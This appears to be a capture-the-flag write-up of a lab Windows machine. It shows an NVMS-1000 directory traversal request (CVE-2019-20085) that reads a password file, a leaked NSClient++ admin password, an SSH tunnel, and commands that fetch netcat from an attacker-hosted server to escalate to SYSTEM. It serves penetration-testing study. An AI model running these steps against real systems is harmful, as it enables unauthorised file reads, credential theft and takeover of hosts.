Phase 2

NVMS-1000 Directory Traversal (CVE-2019-20085)

CVE-2019-20085 NVMS-1000 by TVT Digital has an unauthenticated directory traversal vulnerability. The web server doesn't sanitize ../ sequences in URL paths, allowing attackers to read any file on the system. No login required.

In Burp Suite, send a request with path traversal to read Nathan's password file:

GET /../../../../../../../../../../../../users/nathan/desktop/passwords.txt HTTP/1.1
Host: 10.129.227.77

Phase 4

Privilege Escalation — NSClient++ Script Execution

Read NSClient++ Admin Password

What is NSClient++? An open-source Windows monitoring agent (often paired with Nagios/Icinga). It runs as SYSTEM and provides a web interface on port 8443. Its script execution feature lets admins register external commands (bat/ps1/exe) that run with the service's privileges — SYSTEM. If you get the admin password, you can register and trigger arbitrary commands as SYSTEM. 
nadine@SERVMON C:\Program Files\NSClient++> nscp web -- password --display
Current password: ew2x6SsGTxjRwXOT

nadine@SERVMON> .\nscp.exe --version
NSClient++, Version: 0.5.2.35 2018-01-28

SSH Tunnel (Web UI is localhost-only)

$ ssh -L 8443:127.0.0.1:8443 nadine@10.129.227.77

# Access https://localhost:8443/index.html#/
# Login with: ew2x6SsGTxjRwXOT

Upload nc64.exe

# Attacker: serve nc64.exe
$ wget https://github.com/int0x33/nc.exe/raw/master/nc64.exe
$ python3 -m http.server 8888

# Target: download it
nadine@SERVMON> wget http://10.10.15.65:8888/nc64.exe -o nc64.exe

Appendix

Key Takeaways

Anonymous FTP is an intelligence goldmine.

Even without direct credentials, FTP notes revealed the exact location of a password file and which services were in use. Always enumerate anonymous FTP thoroughly.

CVE-2019-20085 gives unauthenticated arbitrary file read.

NVMS-1000's directory traversal requires no login — just a crafted URL path. Combined with FTP intelligence pointing to Passwords.txt, one request dumps the entire password list.

Password spraying beats brute-forcing.

7 passwords × 2 users = 14 attempts. Much faster and quieter than brute-forcing one account. Always spray when you have a password list.

NSClient++ running as SYSTEM is a known escalation path.

Its script execution feature runs commands with service privileges. Combined with the nscp web -- password --display command leaking the admin password, it's a direct path to SYSTEM.

Localhost-only services are one SSH tunnel away.

NSClient++ was restricted to 127.0.0.1 — but any user with SSH access can forward the port. Network-level restrictions without authentication are not security.
